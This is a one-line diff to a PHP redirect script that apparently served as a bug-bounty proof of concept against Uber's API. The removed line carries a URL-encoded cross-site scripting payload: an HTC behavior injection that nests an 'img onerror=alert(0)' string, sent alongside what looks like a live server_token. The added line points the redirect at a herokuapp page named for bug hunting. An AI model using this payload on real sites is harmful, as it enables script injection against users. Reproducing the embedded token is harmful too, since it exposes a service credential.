@@ -1,1 +1,1 @@
-<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3Cinput%20style=%27behavior:%20url(%2Fv1%2Fproducts%3Fserver_token%3Dr3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t%26%23x26%3Blatitude%3D%26%23x3C%3Bimg%20src%3Dx%20onerror%3Dalert(0)%26%23x3E%3B%26%23x26%3Blongitude%3D116.461745.htc)%27%3E&longitude=116.461745')?>
+<?php header('location: https://bughunt1307.herokuapp.com/ifb.html')?>
